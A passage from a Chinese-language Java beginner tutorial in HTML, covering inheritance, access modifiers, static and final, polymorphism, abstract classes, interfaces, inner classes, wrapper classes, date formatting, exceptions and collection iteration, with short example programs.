index)：返回指定索引处的元素        System.out.println(array.get(0));        System.out.println(array.get(1));        System.out.println(array.get(2));        // public int size()：返回集合中的元素的个数        System.out.println(array.size());        // 输出集合        System.out.println(&quot;array:&quot; + array);    &#125;&#125;</code></pre><hr><h4 id="4、继承"><a href="#4、继承" class="headerlink" title="4、继承"></a>4、继承</h4><p><strong>1、 继承的好处和弊端</strong>：</p><p>继承好处：</p><ul><li>提高了代码的复用性(多个类相同的成员可以放到同一个类中)</li><li>提高了代码的维护性(如果方法的代码需要修改，修改一处即可)</li></ul><p>继承弊端：</p><ul><li>继承让类与类之间产生了关系，类的耦合性增强了，当父类发生变化时子类实现也不得不跟着变化，削弱了子类的独立性。</li></ul><p>继承的应用场景：</p><ul><li>使用继承，需要考虑类与类之间是否存在is..a的关系，不能盲目使用继承。</li><li>is..a的关系：谁是谁的一种，例如：老师和学生是人的一种，那人就是父类，学生和老师就是子类。</li></ul><p><strong>2. 继承中的成员访问特点</strong>：</p><p><strong>2.1 继承中变量的访问特点</strong>：</p><p>在子类方法中访问一个变量，采用的是就近原则。</p><ol><li>子类局部范围找</li><li>子类成员范围找</li><li>父类成员范围找</li><li>如果都没有就报错(不考虑父亲的父亲…)</li></ol><p>示例代码：</p><pre><code class="java">class Fu &#123;    int num = 10;&#125;class Zi &#123;    int num = 20;    public void show()&#123;    int num = 30;    System.out.println(num);    &#125;&#125;public class Demo1 &#123;    public static void main(String[] args) &#123;    Zi z = new Zi();    z.show(); // 输出show方法中的局部变量30    &#125;&#125;</code></pre><p><strong>2.2、super</strong>:</p><p>this&amp;super关键字：</p><ul><li>this：代表本类对象的引用</li><li>super：代表父类存储空间的标识(可以理解为父类对象引用)</li></ul><p>this和super的使用分别：<br><img src="https://img-blog.csdnimg.cn/20200803210418891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br><strong>2.3 继承中构造方法的访问特点</strong>：</p><p><strong>注意：子类中所有的构造方法默认都会访问父类中无参的构造方法。</strong></p><p>子类会继承父类中的数据，可能还会使用父类的数据。所以，子类初始化之前，一定要先完成父类数据的初始化，原因在于，每一个子类构造方法的第一条语句默认都是：<code>super()</code>；</p><p>如果父类中没有无参构造方法，只有带参构造方法，该怎么办呢？</p><ol><li>通过使用super关键字去显示的调用父类的带参构造方法</li><li>在父类中自己提供一个无参构造方法<br>继承中构造方法的访问特点</li></ol><p> <strong>2.4、继承中成员方法的访问特点</strong>：</p><p>通过子类对象访问一个方法</p><ol><li>子类成员范围找</li><li>父类成员范围找</li><li>如果都没有就报错(不考虑父亲的父亲…)</li></ol><p><strong>2.5、 Java中继承的注意事项</strong>：</p><ul><li>Java中类只支持单继承，不支持多继承。</li></ul><p>错误范例：<code>class A extends B, C &#123; &#125;</code></p><ul><li>Java中类支持多层继承。</li></ul><p>多层继承示例代码：</p><pre><code class="java">public class Granddad &#123;    public void drink() &#123;        System.out.println(&quot;爷爷爱喝酒&quot;);    &#125;&#125;</code></pre><pre><code class="java">public class Father extends Granddad &#123;    public void smoke() &#123;        System.out.println(&quot;爸爸爱抽烟&quot;);    &#125;&#125;</code></pre><pre><code class="java">public class Son extends Father &#123;    // 此时，Son类中就同时拥有drink方法以及smoke方法&#125;</code></pre><p> <strong>继承练习</strong>：</p><p>例： 老师和学生</p><p> 需求：定义老师类和学生类，然后写代码测试；最后找到老师类和学生类当中的共性内容，抽取出一个父类，用继承的方式改写代码，并进行测试。</p><pre><code class="java">class Person &#123;    private String name;    private int age;    public Person() &#123;    &#125;    public Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public int getAge() &#123;        return age;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;&#125;</code></pre><pre><code class="java">class Teacher extends Person &#123;    public Teacher() &#123;&#125;    public Teacher(String name,int age) &#123;        super(name,age);//调用父类的有参构造    &#125;    public void teach() &#123;        System.out.println(&quot;用爱成就每一位学员&quot;);    &#125;&#125;</code></pre><pre><code class="java">class Student extends Person&#123;    public Student() &#123;&#125;    public Student(String name, int age) &#123;    super(name,age);    &#125;    public void study()&#123;        System.out.println(&quot;学生学习&quot;);    &#125;&#125;</code></pre><pre><code class="java">class PersonDemo &#123;    public static void main(String[] args)&#123;    //创建老师类对象并进行测试    Teacher t1 = new Teacher();    t1.setName(&quot;林青霞&quot;);    t1.setAge(30);    System.out.println(t1.getName() + &quot;,&quot; + t1.getAge());    t1.teach();    Teacher t2 = new Teacher(&quot;风清扬&quot;, 33);    System.out.println(t2.getName() + &quot;,&quot; + t2.getAge());    t2.teach();    // 创建学生类对象测试    Student s = new Student(&quot;张三&quot;，23)；    System.out.println(s.getName() + &quot;,&quot; + s.getAge());    s.study();    &#125;&#125;</code></pre><hr><h4 id="5、修饰符"><a href="#5、修饰符" class="headerlink" title="5、修饰符"></a>5、修饰符</h4><p><strong>1、权限修饰符</strong>:</p><p><img src="https://img-blog.csdnimg.cn/20200826191017525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>2、final</strong>：</p><p>fianl关键字的作用：</p><ul><li>final代表最终的意思，可以修饰成员方法，成员变量，类。</li></ul><p>final修饰类、方法、变量的效果：</p><ul><li>fianl修饰类：该类不能被继承（不能有子类，但是可以有父类）。</li><li>final修饰方法：该方法不能被重写。</li><li>final修饰变量：表明该变量是一个常量，不能再次赋值。</li></ul><p><strong>3、static</strong>：</p><p>static的概念：</p><ul><li>static关键字是静态的意思，可以修饰【成员方法】，【成员变量】。</li></ul><p>static修饰的特点：</p><ol><li>被类的所有对象共享，这也是我们判断是否使用静态关键字的条件。</li><li>可以通过类名调用当然，也可以通过对象名调用【推荐使用类名调用】。</li></ol><pre><code class="java">class Student &#123;    public String name; //姓名    public int age; //年龄    public static String university; //学校 共享数据！所以设计为静态！    public void show() &#123;    System.out.println(name + &quot;,&quot; + age + &quot;,&quot; + university);    &#125;&#125;public class StaticDemo &#123;    public static void main(String[] args) &#123;        // 为对象的共享数据赋值        Student.university = &quot;传智大学&quot;;        Student s1 = new Student();        s1.name = &quot;林青霞&quot;;        s1.age = 30;        s1.show();        Student s2 = new Student();        s2.name = &quot;风清扬&quot;;        s2.age = 33;        s2.show();    &#125;&#125;</code></pre><p><strong>4、static访问特点</strong>：</p><ul><li>静态成员方法只能访问静态成员【方法或变量】。<blockquote><p> <strong>main方法是静态的。</strong></p></blockquote><hr></li></ul><h4 id="6、多态"><a href="#6、多态" class="headerlink" title="6、多态"></a>6、多态</h4><p><strong>1、什么是多态</strong>？</p><ul><li>同一个对象，在不同时刻表现出来的不同形态。</li></ul><p><strong>2、多态的前提</strong>：</p><ol><li>要有继承或实现关系</li><li>要有方法的重写</li><li>要有父类引用指向子类对象</li></ol><p><strong>3、多态中的成员访问特点</strong>：</p><p>成员变量：</p><ul><li>编译看父类，运行看父类</li></ul><p>成员方法：</p><ul><li>编译看父类，运行看子类</li></ul><p><strong>4、多态的好处和弊端</strong>：</p><p>好处：</p><ul><li>提高程序的扩展性。定义方法时候，使用父类型作为参数，在使用的时候，使用具体的子类型参与操作。</li></ul><p>弊端：</p><ul><li>不能使用子类的特有成员。</li></ul><p><strong>5、多态中的转型</strong>：</p><p>向上转型：</p><ul><li>父类引用指向子类对象</li></ul><p>向下转型：</p><ul><li>格式：子类型 对象名 = (子类型)父类引用;</li></ul><p>例：</p><ul><li>动物类：</li></ul><pre><code class="java">public class Animal &#123;    public void eat() &#123;        System.out.println(&quot;动物吃东西&quot;);    &#125;&#125;</code></pre><ul><li>猫类:</li></ul><pre><code class="java">public class Cat extends Animal &#123;    @Override    public void eat() &#123;        System.out.println(&quot;猫吃鱼&quot;);    &#125;public void playGame() &#123;    System.out.println(&quot;猫捉迷藏&quot;);    &#125;&#125;</code></pre><ul><li>测试类：</li></ul><pre><code class="java">public class AnimalDemo &#123;    public static void main(String[] args) &#123;        //多态        //向上转型        Animal a = new Cat();        a.eat();    //  a.playGame();        //向下转型        Cat c = (Cat)a;        c.eat();        c.playGame();    &#125;&#125;</code></pre><hr><h4 id="7、抽象类"><a href="#7、抽象类" class="headerlink" title="7、抽象类"></a>7、抽象类</h4><p><strong>1、抽象类的概述</strong>：</p><ul><li>当在做子类共性功能抽取时，有些方法在父类中并没有具体的体现，这个时候就需要抽象类了！</li><li>在Java中，一个没有方法体的方法应该定义为抽象方法，而类中如果有抽象方法，该类必须定义为抽象类！</li></ul><p><strong>2、抽象类的特点</strong>：</p><p>1、抽象类和抽象方法必须使用 <code>abstract</code> 关键字修饰。</p><pre><code class="java">    //抽象类的定义    public abstract class 类名 &#123;    //抽象方法的定义        public abstract void eat();&#125;</code></pre><p>2、抽象类中不一定有抽象方法，有抽象方法的类一定是抽象类。</p><p>3、抽象类不能实例化</p><ul><li>抽象类如何实例化呢？参照多态的方式，通过子类对象实例化，这叫<strong>抽象类多态</strong>。</li></ul><p>4、抽象类的子类</p><ul><li>要么重写抽象类中的<code>所有</code>抽象方法</li><li>要么是抽象类</li></ul><p><strong>3、抽象类的成员特点</strong>：</p><p>成员变量：</p><ul><li>既可以是变量</li><li>也可以是常量</li></ul><p>构造方法：</p><ul><li>空参构造</li><li>有参构造</li></ul><p>成员方法：</p><ul><li>抽象方法</li><li>普通方法<hr></li></ul><h4 id="8、接口"><a href="#8、接口" class="headerlink" title="8、接口"></a>8、接口</h4><p><strong>1、接口的概述</strong>：</p><ul><li>接口就是一种公共的规范标准，只要符合规范标准，大家都可以通用。</li><li>Java中的接口更多的体现在对行为的抽象！</li></ul><p><strong>2、接口的特点</strong>：</p><p>1、接口用关键字interface修饰</p><pre><code class="java">public interface 接口名 &#123;&#125;</code></pre><p>2、类实现接口用implements表示</p><pre><code class="java">public class 类名 implements 接口名 &#123;&#125;</code></pre><p>3、接口不能实例化</p><ul><li>接口如何实例化呢？参照多态的方式，通过实现类对象实例化，这叫<strong>接口多态</strong>。</li></ul><p>4、 多态的形式：具体类多态，抽象类多态，接口多态。</p><p>5、接口的子类</p><ul><li>要么重写接口中的所有抽象方法</li><li> 要么子类也是抽象类</li></ul><p><strong>3、抽象类的成员特点</strong>：</p><ol><li><p>成员变量：只能是常量且为静态； 默认修饰符：<code>public static final</code></p></li><li><p>构造方法：没有，因为接口主要是扩展功能的，而没有具体存在。</p></li><li><p>成员方法：只能是抽象方法。默认修饰符：<code>public abstract</code></p><hr></li></ol><h4 id="9、内部类"><a href="#9、内部类" class="headerlink" title="9、内部类"></a>9、内部类</h4><p> <strong>1、内部类的基本使用</strong>：</p><p>1.内部类概念：</p><ul><li>在一个类中定义一个类。举例：在一个类A的内部定义一个类B，类B就被称为内部类。</li></ul><p>例：</p><pre><code class="java">class Outer &#123;    public class Inner &#123;    &#125;&#125;</code></pre><p>2、内部类的访问特点：</p><ul><li>内部类可以直接访问外部类的成员，包括私有</li><li>外部类要访问内部类的成员，必须创建对象</li></ul><p>示例代码：</p><pre><code class="java">/*    内部类访问特点：        内部类可以直接访问外部类的成员，包括私有        外部类要访问内部类的成员，必须创建对象*/public class Outer &#123;    private int num = 10;    public class Inner &#123;        public void show() &#123;            System.out.println(num);        &#125;    &#125;    public void method() &#123;            Inner i = new Inner();            i.show();    &#125;&#125;</code></pre><p><strong>2、成员内部类</strong>：</p><p>1.成员内部类的定义位置：</p><ul><li>在类中方法，跟成员变量是一个位置</li></ul><p>2.外界创建成员内部类格式：</p><ul><li>格式：外部类名.内部类名 对象名 = 外部类对象.内部类对象;</li><li>举例：<code>Outer.Inner oi = new Outer().new Inner();</code></li></ul><p>3.成员内部类的推荐使用方案：</p><ul><li>将一个类，设计为内部类的目的，大多数都是不想让外界去访问，所以内部类的定义应该私有化，私有化之后，再提供一个可以让外界调用的方法，方法内部创建内部类对象并调用。</li></ul><p><strong>3、局部内部类</strong>：</p><p>1.局部内部类定义位置：</p><ul><li>局部内部类是在方法中定义的类</li></ul><p>2.局部内部类方式方式</p><ul><li>局部内部类，外界是无法直接使用，需要在方法内部创建对象并使用。</li><li>该类可以直接访问外部类的成员，也可以访问方法内的局部变量。</li></ul><p>示例代码：</p><pre><code class="java">class Outer &#123;    private int num = 10;    public void method() &#123;        int num2 = 20;        class Inner &#123;            public void show() &#123;                System.out.println(num);                System.out.println(num2);            &#125;        &#125;        Inner i = new Inner();        i.show();    &#125;&#125;</code></pre><pre><code class="java">public class OuterDemo &#123;    public static void main(String[] args) &#123;        Outer o = new Outer();        o.method();    &#125;&#125;</code></pre><p><strong>4、 匿名内部类</strong> （局部内部类的一种）：</p><p>匿名内部类的前提：</p><ul><li>存在一个类或者接口，这里的类可以是具体类也可以是抽象类。</li></ul><p>匿名内部类的格式：</p><ul><li><p>new 类名 ( ) {<br>  重写方法<br>}</p></li><li><p>new 接口名 ( ) {<br>  重写方法<br>}</p></li></ul><p>举例：</p><pre><code class="java">new Inter()&#123;    @Override    public void method()&#123;&#125;&#125;;</code></pre><p>匿名内部类的本质:</p><ul><li>本质：是一个继承了该类或者实现了该接口的子类匿名对象。</li></ul><p>匿名内部类直接调用方法:</p><p>接口：</p><pre><code class="java">interface Inter&#123;    void method();&#125;</code></pre><pre><code class="java">class Test&#123;    public static void main(String[] args)&#123;        new Inter()&#123;            @Override            public void method()&#123;                System.out.println(&quot;我是匿名内部类&quot;);            &#125;        &#125;.method(); // 直接调用方法    &#125;&#125;</code></pre><p>匿名内部类的细节:</p><ul><li>匿名内部类可以通过多态的形式接受。</li></ul><pre><code class="java">Inter i = new Inter()&#123;    @Override    public void method()&#123;    &#125;&#125;</code></pre><p>匿名内部类在开发中的使用：</p><ul><li>当发现某个方法需要，接口或抽象类的子类对象，我们就可以传递一个匿名内部类过去，来简化传统的代码</li></ul><p>示例代码：</p><p>接口：</p><pre><code class="java">interface Jumpping &#123;    void jump();&#125;</code></pre><p>实现类1：</p><pre><code class="java">class Cat implements Jumpping &#123;    @Override    public void jump() &#123;        System.out.println(&quot;猫可以跳高了&quot;);    &#125;&#125;</code></pre><p>实现类2：</p><pre><code class="java">class Dog implements Jumpping &#123;    @Override    public void jump() &#123;        System.out.println(&quot;狗可以跳高了&quot;);    &#125;&#125;</code></pre><p>操作类：</p><pre><code class="java">class JumppingOperator &#123;    public void method(Jumpping j) &#123; //new Cat(); new Dog();        j.jump();    &#125;&#125;</code></pre><p>测试类：</p><pre><code class="java">class JumppingDemo &#123;    public static void main(String[] args) &#123;        //需求：创建接口操作类的对象，调用method方法        JumppingOperator jo = new JumppingOperator();        Jumpping j = new Cat();        jo.method(j);        Jumpping j2 = new Dog();        jo.method(j2);        System.out.println(&quot;­­­­­­­­&quot;);        // 匿名内部类的简化        jo.method(new Jumpping() &#123;            @Override            public void jump() &#123;                System.out.println(&quot;猫可以跳高了&quot;);            &#125;        &#125;);        // 匿名内部类的简化        jo.method(new Jumpping() &#123;            @Override            public void jump() &#123;                System.out.println(&quot;狗可以跳高了&quot;);            &#125;        &#125;);    &#125;&#125;</code></pre><hr><h4 id="9、包装类"><a href="#9、包装类" class="headerlink" title="9、包装类"></a>9、包装类</h4><p><strong>1、基本类型包装类</strong>：</p><ul><li><p>基本类型包装类的作用：将基本数据类型封装成对象的好处在于可以在对象中定义更多的功能方法操作该数据。</p></li><li><p>常用的操作之一：用于基本数据类型与字符串之间的转换。</p></li></ul><p>基本类型对应的包装类：</p><p><img src="https://img-blog.csdnimg.cn/20200820181227350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>1.2、int和String类型的相互转换</strong>：</p><p>1、int转换为String:</p><p>转换方式：</p><ul><li>方式一：直接在数字后加一个空字符串</li><li>方式二：通过String类静态方法valueOf()</li></ul><p>例：</p><pre><code class="java">public class IntegerDemo &#123;    public static void main(String[] args) &#123;        //int --- String        int number = 100;        //方式1        String s1 = number + &quot;&quot;;        System.out.println(s1);        //方式2        //public static String valueOf(int i)        String s2 = String.valueOf(number);        System.out.println(s2);        System.out.println(&quot;--------&quot;);    &#125;&#125;</code></pre><p>2、String转换为int：</p><p>转换方式：</p><ul><li>方式一：先将字符串数字转成Integer，再调用<code>valueOf()</code>方法。</li><li>方式二：通过Integer静态方法<code>parseInt()</code>进行转换。</li></ul><p>例：</p><pre><code class="java">public class IntegerDemo &#123;    public static void main(String[] args) &#123;    //String --- int    String s = &quot;100&quot;;    //方式1：String --- Integer --- int    Integer i = Integer.valueOf(s);    //public int intValue()    int x = i.intValue();    System.out.println(x);    //方式2    //public static int parseInt(String s)    int y = Integer.parseInt(s);    System.out.println(y);    &#125;&#125;</code></pre><p><strong>3、自动拆箱和自动装箱</strong>：</p><p>自动装箱：</p><ul><li>把基本数据类型转换为对应的包装类类型</li></ul><p>自动拆箱：</p><ul><li>把包装类类型转换为对应的基本数据类型</li></ul><p>示例代码：</p><pre><code class="java">    Integer i = 100; // 自动装箱    i += 200; // i = i + 200; i + 200 自动拆箱；i = i + 200; 是自动装箱</code></pre><h4 id="10、时间日期类"><a href="#10、时间日期类" class="headerlink" title="10、时间日期类"></a>10、时间日期类</h4><p><strong>1、 SimpleDateFormat类</strong>：</p><p>SimpleDateFormat类构造方法:</p><p><img src="https://img-blog.csdnimg.cn/20200822003633751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>SimpleDateFormat类的常用方法：</p><ul><li>格式化(从Date到String)：public final String format(Date date)：将日期格式化成日期/时间字符串。</li></ul><ul><li>解析(从String到Date)：public Date parse(String source)：从给定字符串的开始解析文本以生成日期。</li></ul><p>例：</p><pre><code class="java">public class SimpleDateFormatDemo &#123;    public static void main(String[] args) throws ParseException &#123;        //格式化：从 Date 到 String        Date d = new Date();//             SimpleDateFormat sdf = new SimpleDateFormat();        SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy年MM月dd日 HH:mm:ss&quot;);        String s = sdf.format(d);        System.out.println(s);        System.out.println(&quot;--------&quot;);        //从 String 到 Date        String ss = &quot;2048-08-09 11:11:11&quot;;        //ParseException        SimpleDateFormat sdf2 = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);        Date dd = sdf2.parse(ss);        System.out.println(dd);    &#125;&#125;</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200822004554286.png#pic_center"></p><hr><h4 id="11、异常"><a href="#11、异常" class="headerlink" title="11、异常"></a>11、异常</h4><p><strong>1、异常</strong>：</p><p>异常的概述：</p><ul><li>异常就是程序出现了不正常的情况。</li></ul><p>异常的体系结构：<br>                         <img src="https://img-blog.csdnimg.cn/20200822150419747.png"><br>Error ：严重问题，不需要处理。</p><p>Exception：称为异常类，它表示程序本身可以处理的问题。</p><ul><li>RuntimeException：在编译期是不检查的，出现问题后，需要我们回来修改代码。</li><li>非RuntimeException：编译期就必须处理的，否则程序不能通过编译，就更不能正常运行了。</li></ul><p><strong>2、Throwable成员方法</strong>:</p><p>常用方法：</p><p><img src="https://img-blog.csdnimg.cn/20200822232918326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>例：</p><pre><code class="java">public class ExceptionDemo02 &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;开始&quot;);        method();        System.out.println(&quot;结束&quot;);    &#125;    public static void method() &#123;        try &#123;        int[] arr = &#123;1, 2, 3&#125;;        System.out.println(arr[3]); //new ArrayIndexOutOfBoundsException();        System.out.println(&quot;这里能够访问到吗&quot;);        &#125; catch (ArrayIndexOutOfBoundsException e) &#123; //new ArrayIndexOutOfBoundsException();        //public String getMessage():返回此 throwable 的详细消息字符串//           System.out.println(e.getMessage());        //Index 3 out of bounds for length 3        //public String toString():返回此可抛出的简短描述//           System.out.println(e.toString());        //java.lang.ArrayIndexOutOfBoundsException: Index 3 out of bounds for length 3        //public void printStackTrace():把异常的错误信息输出在控制台：        e.printStackTrace();//         java.lang.ArrayIndexOutOfBoundsException: Index 3 out of boundsfor length 3//         at com.itheima_02.ExceptionDemo02.method(ExceptionDemo02.java:18)//         at com.itheima_02.ExceptionDemo02.main(ExceptionDemo02.java:11)        &#125;    &#125;&#125;</code></pre><p><strong>3、编译时异常和运行时异常的区别</strong>：</p><p>编译时异常：</p><ul><li>都是Exception类及其子类</li><li>必须显示处理，否则程序就会发生错误，无法通过编译</li></ul><p>运行时异常：</p><ul><li>都是RuntimeException类及其子类</li><li>无需显示处理，也可以和编译时异常一样处理</li></ul><p><strong>4、throws方式处理异常</strong>：</p><p>格式：</p><pre><code class="java">    public void 方法() throws 异常类名 &#123;    &#125;</code></pre><p>注意事项：</p><ol><li>throws格式是跟在方法的括号后面的。</li><li>编译时异常必须要进行处理，两种处理方案：try…catch …或者 throws，如果采用 throws 这种方案，<strong>将来谁调用谁处理</strong>。</li><li>运行时异常可以不处理，出现问题后，需要我们回来修改代码。</li></ol><p>示例代码：</p><pre><code class="java">public class ExceptionDemo &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;开始&quot;);//             method();        try &#123;    //谁调用谁处理            method2();        &#125;catch (ParseException e) &#123;            e.printStackTrace();        &#125;        System.out.println(&quot;结束&quot;);    &#125;    //编译时异常    public static void method2() throws ParseException &#123;        String s = &quot;2048-08-09&quot;;        SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd&quot;);        Date d = sdf.parse(s);        System.out.println(d);&#125;    //运行时异常 可抛可不抛    public static void method() throws ArrayIndexOutOfBoundsException &#123;        int[] arr = &#123;1, 2, 3&#125;;        System.out.println(arr[3]);    &#125;&#125;</code></pre><p><strong>5、自定义异常</strong>：</p><p>例：</p><ul><li><p>自定义异常类：</p><pre><code class="java">public class ScoreException extends Exception &#123;  public ScoreException() &#123;&#125;  public ScoreException(String message) &#123;      super(message);  &#125;</code></pre></li></ul><p>}</p><pre><code>- 老师类：```javapublic class Teacher &#123;    public void checkScore(int score) throws ScoreException &#123;        if(score&lt;0 || score&gt;100) &#123;//             throw new ScoreException();        throw new ScoreException(&quot;你给的分数有误，分数应该在0-100之间&quot;);    &#125; else &#123;        System.out.println(&quot;成绩正常&quot;);        &#125;    &#125;&#125;</code></pre><ul><li>测试类：</li></ul><pre><code class="java">public class Demo &#123;    public static void main(String[] args) &#123;        Scanner sc = new Scanner(System.in);        System.out.println(&quot;请输入分数：&quot;);        int score = sc.nextInt();        Teacher t = new Teacher();        try &#123;            t.checkScore(score);        &#125; catch (ScoreException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><h4 id="12、Collection集合"><a href="#12、Collection集合" class="headerlink" title="12、Collection集合"></a>12、Collection集合</h4><p><strong>1、集合体系结构</strong>：</p><p>集合类的特点：</p><ul><li>提供一种存储空间可变的存储模型，存储的数据容量可以随时发生改变</li></ul><p>集合类的体系图：</p><p><img src="https://img-blog.csdnimg.cn/20200824000931288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p>其中：</p><ul><li>List 为<strong>有序可重复</strong>的，</li><li>Set 为<strong>无序不可重复</strong>的。</li></ul><p><strong>2、Collection集合概述和基本使用</strong>：</p><p>Collection集合概述：</p><ul><li>是单例集合的顶层接口，它表示一组对象，这些对象也称为Collection的元素。</li><li>JDK 不提供此接口的任何直接实现，它提供更具体的子接口（如Set和List）实现。</li></ul><p>Collection集合的常用方法：<br><img src="https://img-blog.csdnimg.cn/20200824092217259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>Collection集合基本使用：</p><pre><code class="java">public class CollectionDemo01 &#123;    public static void main(String[] args) &#123;        //创建Collection集合的对象        Collection&lt;String&gt; c = new ArrayList&lt;String&gt;();        //添加元素：boolean add(E e)        c.add(&quot;hello&quot;);        c.add(&quot;world&quot;);        c.add(&quot;java&quot;);        //输出集合对象        System.out.println(c);    &#125;&#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20200824092623241.png#pic_center"><br>其中ArrayList重写了<code>toString</code>方法，直接输出了集合添加的内容。</p><p><strong>3、Collection集合的遍历</strong>：</p><p>lterator：迭代器，集合的专用遍历方式</p><ul><li><code>Iterator &lt;E&gt; iterator()</code>：返回此集合中元素的迭代器，通过集合的<code>iterator()</code>方法得到</li><li>迭代器是通过集合的<code>iterator()</code>方法得到的，所以我们说它是依赖于集合而存在的</li></ul><p>lterator中的常用方法：</p><ul><li>E next()：返回迭代中的下一个元素</li><li>boolean hasNext()：如果迭代具有更多元素，则返回true</li></ul><p>示例代码：</p><pre><code class="java">public class IteratorDemo &#123;    public static void main(String[] args) &#123;        //创建集合对象        Collection&lt;String&gt; c = new ArrayList&lt;&gt;();        //添加元素        c.add(&quot;hello&quot;);        c.add(&quot;world&quot;);        c.add(&quot;java&quot;);        c.add(&quot;javaee&quot;);        //Iterator&lt;E&gt; iterator()：返回此集合中元素的迭代器，通过集合的iterator()方法得到        Iterator&lt;String&gt; it = c.iterator();        //用while循环改进元素的判断和获取        while (it.hasNext()) &#123;            String s = it.next();            System.out.println(s);        &#125;    &#125;&#125;</code></pre><p>输出结果：<br><img src="https://img-blog.csdnimg.cn/202008242236483.png"></p><h4 id="13、List集合"><a href="#13、List集合" class="headerlink" title="13、List集合"></a>13、List集合</h4><p><strong>1、List集合概述和特点</strong>：</p><p>List集合概述：</p><ul><li>有序集合(也称为序列)，用户可以精确控制列表中每个元素的插入位置。用户可以通过整数索引访问元素，并搜索列表中的元素。</li><li>与Set集合不同，列表通常允许重复的元素。</li></ul><p>List集合特点：</p><ol><li>有索引</li><li>可以存储重复元素</li><li>元素存取有序</li></ol><p><strong>2、List集合的特有方法</strong>：</p><p><img src="https://img-blog.csdnimg.cn/2020082610354832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>3、并发修改异常</strong>：</p><p>出现的原因：</p><ul><li>迭代器遍历的过程中，通过集合对象修改了集合中的元素，造成了迭代器获取元素中判断预期修改值和实际修改值不一致，则会出现：ConcurrentModificationException</li></ul><p>解决的方案：</p><ul><li>用for循环遍历，然后用集合对象做对应的操作即可。</li></ul><p>示例代码：</p><pre><code class="java">public class ListDemo &#123;    public static void main(String[] args) &#123;        //创建集合对象        List&lt;String&gt; list = new ArrayList&lt;String&gt;();        //添加元素        list.add(&quot;hello&quot;);        list.add(&quot;world&quot;);        list.add(&quot;java&quot;);        //遍历集合，得到每一个元素，看有没有&quot;world&quot;这个元素，如果有，我就添加一个&quot;javaee&quot;元素，请写代码实现//         Iterator&lt;String&gt; it = list.iterator();//         while (it.hasNext()) &#123;//             String s = it.next();//             if(s.equals(&quot;world&quot;)) &#123;//                 list.add(&quot;javaee&quot;);//             &#125;//         &#125;        for(int i=0; i&lt;list.size(); i++) &#123;            String s = list.get(i);            if(s.equals(&quot;world&quot;)) &#123;            list.add(&quot;javaee&quot;);            &#125;        &#125;        //输出集合对象        System.out.println(list);    &#125;&#125;</code></pre><p><strong>4、列表迭代器</strong>：</p><p>ListIterator介绍：</p><ul><li><p>通过List集合的<code>listIterator()</code>方法得到，所以说它是List集合特有的迭代器。</p></li><li><p>用于<strong>允许</strong>程序员沿任一方向遍历的列表迭代器，在迭代期间修改列表，并获取列表中迭代器的当前位置。</p><p>示例代码：</p></li></ul><pre><code class="java">public class ListIteratorDemo &#123;    public static void main(String[] args) &#123;        //创建集合对象        List&lt;String&gt; list = new ArrayList&lt;String&gt;();        //添加元素        list.add(&quot;hello&quot;);        list.add(&quot;world&quot;);        list.add(&quot;java&quot;);        //获取列表迭代器        ListIterator&lt;String&gt; lit = list.listIterator();        while (lit.hasNext()) &#123;            String s = lit.next();            if(s.equals(&quot;world&quot;)) &#123;                lit.add(&quot;javaee&quot;);            &#125;        &#125;        System.out.println(list);    &#125;&#125;</code></pre><p><strong>5、增强for循环</strong>：</p><p>增强for目的：简化数组和Collection集合的遍历</p><ul><li>实现lterable接口的类允许其对象成为增强型for语句的目标。</li><li>它是JDK5之后出现的，其内部原理是一个lterator迭代器。</li></ul><p>格式：</p><pre><code class="java">    for(元素数据类型 变量名 : 数组/集合对象名) &#123;        循环体;    &#125;</code></pre><p>示例代码：</p><pre><code class="java">public class ForDemo &#123;    public static void main(String[] args) &#123;        int[] arr = &#123;1,2,3,4,5&#125;;        for(int i : arr) &#123;            System.out.println(i);        &#125;        System.out.println(&quot;--------&quot;);        String[] strArray = &#123;&quot;hello&quot;,&quot;world&quot;,&quot;java&quot;&#125;;        for(String s : strArray) &#123;        System.out.println(s);        &#125;        System.out.println(&quot;--------&quot;);        List&lt;String&gt; list = new ArrayList&lt;String&gt;();        list.add(&quot;hello&quot;);        list.add(&quot;world&quot;);        